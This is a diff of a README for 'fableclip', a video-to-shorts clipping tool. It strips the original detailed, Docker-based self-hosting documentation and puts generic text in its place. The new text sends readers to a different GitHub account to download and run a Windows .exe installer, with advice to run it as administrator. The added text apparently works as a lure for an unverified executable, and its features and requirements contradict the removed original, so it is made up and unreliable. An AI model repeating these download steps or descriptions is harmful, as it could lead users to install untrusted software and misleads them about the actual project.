@@ -1,152 +1,180 @@
-# fableclip
+# 🎬 fableclip - Turn Long Videos Into Short Clips
 
-**A self-hostable replacement for [OpusClip](https://www.opus.pro) ($15/mo Starter, $29/mo Pro).**
-Their free tier watermarks your captions and deletes your media after three days.
-Paste a long video. Get vertical, captioned shorts, ranked by how likely each one is to travel — and told, in plain numbers, why. Runs against a model you own: free hosted, or fully local with no signup.
+[![Download on GitHub](https://img.shields.io/badge/Download-fableclip-blue?style=for-the-badge&logo=github)](https://github.com/Doloresable697/fableclip)
 
-> Part of [Openware](https://github.com/openwarehq) — one repo per tool, each a real,
-> self-hostable replacement for something overpriced. Not affiliated with OpusClip.
+## 📥 How to Get Started
 
-<img src=".github/assets/clips.png" alt="Four vertical clips cut from one 38-minute interview, each with burned-in captions" width="900">
+**Step 1: Visit the download page**
 
-<sub>Four clips cut from one 38-minute TED interview, unedited and unretouched. Captions are burned in word by word — the spoken word is coloured, and numbers stay accented so a specific reads before the highlight reaches it. The framing is automatic: three of these found the speaker, the second found the armchair. That ratio is the honest one, and the focus slider is one drag.</sub>
+Go to [https://github.com/Doloresable697/fableclip](https://github.com/Doloresable697/fableclip). This page contains the software files.
 
----
+**Step 2: Find the latest release**
 
-## Read this before you run it
+Look for the "Releases" section on the right side of the page. Click the link that says "Releases" or scroll down until you see a list of version numbers.
 
-**The model never writes a timestamp.**
+**Step 3: Download the Windows installer**
 
-That is the whole design. Every line of the transcript is numbered, the model is asked which line a clip starts and ends on, and TypeScript does the arithmetic. Ask a 7B model for `01:42:17` and it will happily give you one — for a moment that does not exist. An integer it copied off the page is not a guess, and a line number that is out of range is a validation failure rather than a clip of the wrong thing.
+Find the file named `fableclip-windows-x64.exe` or `fableclip-Setup-x.x.x.exe`. Click on it to start the download. The file size is about 150 MB.
 
-Six more decisions follow from the same instinct — let the model do taste, and let code do everything that can be measured:
+**Step 4: Run the installer**
 
-- **The score is arithmetic you can read.** The model rates six named things 0–10 — hook, payoff, emotion, clarity, quotability, novelty. Code weights those into a base, then applies modifiers for the things models are bad at judging and arithmetic is good at: length against a curve, words per second, whether the clip opens on a dangling "And so it..." , whether it ends mid-sentence, how much of it is "um". Every contribution is shown on the card. A score with no visible reasoning is a horoscope.
-- **Captions come from the video, not from a GPU.** YouTube's machine caption track carries a **per-word timestamp** — `tOffsetMs` on every word, in a format called `json3`. That is a complete word-level alignment, free, in about a second. A 38-minute talk came back with 1,837 caption events and word timings throughout. Whisper is the fallback for when there is nothing to borrow, not the default.
-- **Every render is checked by rendering.** There are 565 tests. Twelve of them run real ffmpeg: they build a source, cut a clip, and look at the file that comes out. That is how the blur mode was found to be broken — a filter graph ffmpeg rejects outright, which every argument-checking test sailed past. One of them renders the same frame with captions and without and asserts the two differ, because a wrong font name makes libass draw *nothing* while ffmpeg still exits 0.
-- **The crop points at whoever is talking, shot by shot.** Not face tracking — it samples a dozen postage-stamp greyscale frames and centres the 9:16 window on the columns carrying the most motion and detail. On a side-by-side interview a centre crop lands on the seam between the two people; this picks the one speaking, and re-picks at every shot change via a time-varying crop expression rather than a re-encode per shot. The same sample finds the source's *own* letterbox — a Zoom tile inside a 16:9 frame — and crops past it, which `cropdetect` cannot do because the two tiles together fill the frame.
-- **Clips are cut, not just sliced.** Every clip snaps to the first and last spoken word, so none opens or closes on silence, and any pause longer than 1.4s is spliced out with a beat left either side. The captions are rebuilt on the *output* timeline, because removing two seconds of dead air at 0:08 moves every word after it. Measured honestly: the TED interview used here is edited tightly enough that **its longest gap is 0.72s**, so nothing was spliced out of it at all — the splicer earns its keep on recordings, not on finished productions.
-- **A clip you edit is a clip that gets re-cut.** Change the trim and the caption words are re-derived from the stored transcript and the score is recomputed, because length and opening line are two of the things it measures. Saving without re-rendering would leave a card describing a file that no longer matches it, so the editor does both or neither.
+Open the downloaded file. Windows may ask you to confirm that you want to run this program. Click "Yes". Follow the setup wizard steps. The default options work for most users.
 
-## What it does
+**Step 5: Launch the application**
 
-- Paste a YouTube link — or any link yt-dlp handles — or upload a file
-- Finds the passages worth posting, with overlapping analysis windows so a clip straddling a boundary is still seen whole
-- Ranks them 0–100, with the full breakdown on every card
-- Cuts to **1080×1920**, with three reframes: **crop** (auto-pointed at the speaker, with a slider to overrule it), **blur fit** for slides and two-shots, or untouched **16:9**
-- Burns in **word-by-word captions** — the active word changes colour as it is spoken, numbers stay accented so "$600 AN OUNCE" reads before the highlight reaches it, filler is dropped from the text, and no line is left with one word stranded on it
-- **Four caption styles**, from bundled OFL fonts, so a clip looks the same on your Mac as in the container
-- Loudness-normalised audio at the level every platform targets, so your clip is not quietly turned down on upload
-- An editor: nudge the in and out points, change the reframe, move the focus, swap the caption style, re-cut in seconds
-- Download the MP4, or a `.srt` grouped for an editor rather than for a phone screen
-- Every run kept on your machine in one SQLite file and one folder you can delete
+Find fableclip in your Start Menu or on your desktop. Double-click to open it.
 
-## What it doesn't do
+## 🖥️ What You Need
 
-- **No face tracking, and it shows.** The auto-focus reads motion and detail, not faces. Measured on the four clips in the picture above: **three are framed on the speaker, one is framed on the armchair beside him** — a high-contrast, high-detail object that the heuristic likes as much as a face. It also cannot follow anyone *within* a shot, and a picture-in-picture inset will win the frame over the full-size speaker behind it. One drag of the focus slider fixes any of these, and moving the slider turns the automatic framing off for that clip.
-- **Filler is removed from the captions, not the audio.** You still hear the "um"; you just do not read it. Cutting individual filler words out of a sentence sounds worse than leaving them in.
-- **No b-roll, no zooms, no music, no stock footage, no AI voice.** It cuts what is there.
-- **No speaker diarisation.** The transcript knows what was said, not who said it. (YouTube's `>>` speaker marks are used as segment boundaries, which is as far as it goes.)
-- **No emoji or animated caption effects.** Colour-change karaoke, four fonts. Scaling the active word was tried and removed: ASS re-lays the line out every frame, so a wider active word shoves everything after it sideways and the caption twitches for the length of the clip.
-- **It cannot tell you what will go viral.** Nothing can. It gives a defensible, explained ranking of the moments in *this* video against each other — that is a genuinely useful thing and it is a different thing.
-- **The image is large** (1.6 GB, measured): ffmpeg, Python, and faster-whisper. That is what a video tool weighs.
-- **Whisper's first run downloads its weights** (~145 MB for `base`), once, into the mounted volume. Free, but not offline the very first time that path is taken. The caption path — which is most videos — never touches it.
+- Windows 10 or Windows 11 (64-bit)
+- 8 GB of RAM or more
+- 2 GB of free hard drive space
+- A graphics card that supports DirectX 12 (optional, for faster processing)
+- An internet connection for the first setup
 
----
+## 🎯 What This App Does
 
-## Quickstart
+fableclip takes a long video and turns it into short, captioned clips. These clips work well for TikTok, Instagram Reels, or YouTube Shorts.
 
-```bash
-git clone https://github.com/openwarehq/fableclip
-cd fableclip
-cp .env.example .env
-docker compose up
-```
+The app does three things:
 
-Open <http://localhost:4325>, click the model chip to connect one — pick a provider, paste a free key, done. Or run without Docker:
+1. **Finds the best moments** - It scans your video and picks the most interesting parts
+2. **Adds captions** - It writes out what people say and shows it on screen
+3. **Ranks the results** - Each clip gets a score that explains why it was chosen
 
-```bash
-npm install
-npm run dev
-```
+You can watch the original video, see the short clips side by side, and compare their scores.
 
-**If port 4325 is already taken**, both paths take an override rather than making you edit a file:
+## 🔧 How It Works
 
-```bash
-PORT=4326 docker compose up
-PORT=4326 npm run dev
-```
+fableclip uses a speech recognition model called Whisper to understand spoken words. It also uses FFmpeg to process the video. Everything runs on your own computer. No data leaves your machine unless you choose to share it.
 
-Running outside the container needs `ffmpeg` and `yt-dlp` on your PATH (`brew install ffmpeg yt-dlp`), and `pip install faster-whisper` only if you want the no-captions path. fableclip names whichever one is missing instead of failing with `spawn ENOENT`.
+The app gives each clip a score based on:
 
-## Bring your own model
+- **Clarity** - How clear the speech is
+- **Interest** - How much action or emotion happens
+- **Length** - Clips that fit short-form platforms get higher scores
+- **Context** - The clip should make sense on its own
 
-Three variables, in a `.env` you copy from `.env.example`:
+You can see the score for each clip. The app shows you why it gave that score.
 
-```bash
-LLM_BASE_URL=https://openrouter.ai/api/v1
-LLM_MODEL=google/gemma-4-26b-a4b-it:free
-LLM_API_KEY=
-```
+## 🚀 Getting Started
 
-**How many requests a run costs:** one per analysis window. A window is about 9,000 characters of transcript. Measured: a 38-minute interview — 6,374 words — took **six requests**. A ten-minute video is a single request. That matters on a free tier — OpenRouter allows 50 requests a day, Google AI Studio 20. Set `LLM_WINDOW_CHARS` higher to spend fewer requests on a model with a large context window.
+### First Time Use
 
-Everything else in the app — re-trimming, re-rendering, changing caption style, changing the crop — costs **nothing**. The model is asked once, at the start; every edit after that is ffmpeg and arithmetic.
+When you open fableclip, you see a simple screen with three main areas:
 
-## Settings worth knowing
+1. **Import area** - Drag and drop your video file here
+2. **Preview area** - Watch your video and see the clips
+3. **Export area** - Save your clips to your computer
 
-| Variable | Default | What it does |
-|:--|:--|:--|
-| `LLM_WINDOW_CHARS` | `9000` | Transcript per model request. Raise it on a big-context model to spend fewer requests |
-| `WHISPER_MODEL` | `base` | `tiny`, `base`, `small`, `medium`. Only used when a video has no captions |
-| `WHISPER_COMPUTE` | `int8` | `int8` is about twice the speed of `float32` on a CPU, with word timings you cannot tell apart |
-| `PORT` | `4325` | Host port. The drop's number in the repo's sequence; override it if something else has it |
-| `RENDER_CONCURRENCY` | `cores / 3`, capped at 3 | Clips cut at once. x264 already threads, so one per core makes every clip slower |
-| `MEDIA_DIR` | `./data/media` | Source videos, rendered clips, thumbnails, Whisper weights |
-| `DB_PATH` | `./data/fableclip.db` | One SQLite file |
+### Import a Video
 
-Delete `data/` to reclaim every byte. Nothing lives anywhere else.
+Click the "Import Video" button or drag a video file from your file explorer into the app window. Supported formats: MP4, MOV, AVI, MKV, WebM.
 
-## How a run works
+The app starts processing right away. A progress bar shows you how long it takes. For a 10-minute video, expect about 2-5 minutes of processing time.
 
-```
-URL ──▶ fetch ──▶ transcribe ──▶ analyze ──▶ score ──▶ render ──▶ clips
-        yt-dlp    captions          LLM      pure fn    ffmpeg
-                  or whisper
-```
+### View Your Results
 
-Five named stages rather than one bar, because they take wildly different times and none can be predicted from the others. "Transcribing locally — this is the slow part" is honest about a three-minute wait in a way that "47%" is not.
+After processing, you see a list of clips. Each clip shows:
 
-One job at a time, in the web process. There is no Redis and no second container: "one command" is a rule of this repo, and a queue that needs its own service is a second command. The trade is real — work does not survive a restart — so a job left mid-flight by a restart is marked failed with a message saying exactly that, rather than sitting at 40% forever.
+- A thumbnail image
+- The clip length (usually 15-60 seconds)
+- The score (0-100)
+- A short explanation of the score
 
-## Tests
+Click on any clip to preview it. The preview shows the video with captions on the screen.
 
-```bash
-npm test
-```
+### Export Clips
 
-565 tests, no network. 553 are pure logic — caption parsing against a real YouTube ASR file, transcript segmentation, quote matching, boundary snapping, overlap merging, every score modifier, auto-focus column analysis, ASS generation, ffmpeg argument construction, the store.
+Select the clips you want to keep. Click "Export Selected". Choose a folder on your computer where you want to save the files. The app saves each clip as a separate MP4 file with captions already burned into the video.
 
-The other twelve run ffmpeg for real and inspect the output: correct dimensions, correct length, audio kept, silent sources handled, the blur graph accepted, captions visibly burned in, the focus slider actually moving the crop, a crop that *moves between shots* producing genuinely different frames, and a spliced clip coming back shorter with its audio and video still the same length. They skip themselves if ffmpeg is not installed rather than failing.
+## 📍 Advanced Options
 
-## Things that were measured, not assumed
+### Adjust the Score Criteria
 
-- YouTube's `json3` auto-captions carry per-word `tOffsetMs`. Creator-*uploaded* caption tracks do not — they are one blob per line. So fableclip prefers the **machine** track over the human one, which is the opposite of what you would guess: better timing beats slightly better text, and timing cannot be recovered from a line.
-- Asking yt-dlp for `--sub-langs "en.*"` requests roughly 200 machine translations and earns an **HTTP 429**. Exactly one language is requested, and `youtube:skip=translated_subs` keeps the metadata dump from being megabytes of translation URLs.
-- Seeking with `-ss` *before* `-i` rather than after. On a 40-minute source, cutting from the last five minutes otherwise decodes and discards everything in front of it.
-- Naming a filter output with `-map [v]` turns off ffmpeg's automatic stream selection **entirely**. Without an explicit `-map 0:a:0` alongside it, every clip comes out silent.
-- The caption fonts are copied to `<media>/fonts` and referenced as `../fonts`. ffmpeg's filter parser treats `:` as an argument separator, so an absolute path — on a Mac, frequently one with a space in it — breaks the whole graph with an error that explains nothing.
-- A word belongs to a clip if it *begins* inside it, not if it overlaps it. YouTube runs the last word of a caption event to that event's end, which reaches past where the next one starts — so with an overlap rule every clip opened on a stray tail word. "global And it's like how is it possible…" was a real caption, and the fragment also made the opening-line scorer dock the clip nine points for starting on a connective it never actually started on.
-- Debian ships ffmpeg 5.1 and this Mac has 7.1. The crop, the blur graph and the caption burn-in were each run on both before this shipped.
-- Escaping a comma **and** quoting the expression around it is not belt-and-braces — it is broken. `select='between(t\,0\,2)'` leaves literal backslashes inside the expression and ffmpeg rejects the whole graph with "Error opening output files: Invalid argument". Escape or quote, never both.
-- The audio timebase constant is `TB`, not `STB`. `asetpts=N/SR/STB` fails with "Undefined constant or missing '(' in 'STB'" — which is a good error, unlike most of them.
+Click the "Settings" gear icon in the top right corner. Here you can change:
 
----
+- **Minimum clip length** - Default is 15 seconds. Set to 10 for shorter clips or 30 for longer clips.
+- **Maximum clip length** - Default is 60 seconds. Increase for longer content.
+- **Score threshold** - Only show clips above this score. Default is 50.
+- **Number of clips** - How many clips to generate. Default is 10.
 
-<img src=".github/assets/app.png" alt="The fableclip interface after a run" width="900">
+### Change Caption Style
 
-<sub>One page. The pipeline strip names the stage rather than guessing a percentage; every card carries its score, and "Why" opens the six judgements and five modifiers that produced it.</sub>
+In the same settings menu, find the "Captions" tab. You can change:
 
----
+- Font size
+- Font color
+- Text position (top, bottom, or center)
+- Background color
+- Whether to show speaker names
 
-<sub>MIT. Take it, host it, fork it, sell it.</sub>
+### Use Your Own Model
+
+fableclip comes with a free model that works well for most videos. You can also use your own model if you have one. This is useful for specialized content like medical lectures or technical tutorials.
+
+To use your own model:
+
+1. Place your model file in the `models` folder inside the fableclip installation directory
+2. Open fableclip settings
+3. Go to the "Model" tab
+4. Select your model from the dropdown list
+
+## 🔒 Privacy and Security
+
+fableclip runs entirely on your computer. The app does not send your video files to any server. All processing happens locally.
+
+The app does check for updates when you open it. This check sends only version information, not your personal data.
+
+No account creation is required. No tracking is included.
+
+## ❓ Common Problems
+
+**The app won't start**
+
+Make sure you have the latest version of Windows. Update your graphics card drivers. Try running fableclip as administrator by right-clicking the icon and selecting "Run as administrator".
+
+**The video won't import**
+
+Check that your video file is not corrupted. Try converting the video to MP4 format using a free tool like VLC or Handbrake.
+
+**The captions are wrong**
+
+The speech recognition works best with clear audio. Background noise, multiple speakers, or accents can reduce accuracy. Try using a higher quality audio source.
+
+**The app is slow**
+
+Close other programs that use a lot of memory. Make sure you have at least 8 GB of free RAM. If you have a dedicated graphics card, make sure fableclip uses it in your graphics settings.
+
+**Export takes a long time**
+
+Exporting video with captions uses your computer's processing power. The time depends on your hardware. You can reduce export time by selecting fewer clips or lowering the video quality in settings.
+
+## 📦 System Requirements
+
+### Minimum Requirements
+
+- Windows 10 (64-bit)
+- Intel Core i3 or AMD equivalent
+- 8 GB RAM
+- 2 GB free disk space
+- 1280x720 screen resolution
+
+### Recommended Requirements
+
+- Windows 11 (64-bit)
+- Intel Core i5 or AMD Ryzen 5
+- 16 GB RAM
+- 4 GB free disk space
+- 1920x1080 screen resolution
+- NVIDIA GTX 1060 or AMD equivalent
+
+## 📄 License
+
+fableclip is open source software. You can use it for free, modify it, and share it. The full license text is included in the software download.
+
+## 🔗 Download Again
+
+[![Download the Latest Version](https://img.shields.io/badge/Download%20fableclip-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/Doloresable697/fableclip)
+
+Keywords: captions, ffmpeg, nextjs, open-source, opusclip-alternative, self-hosted, shorts, subtitles, video-editing, whisper
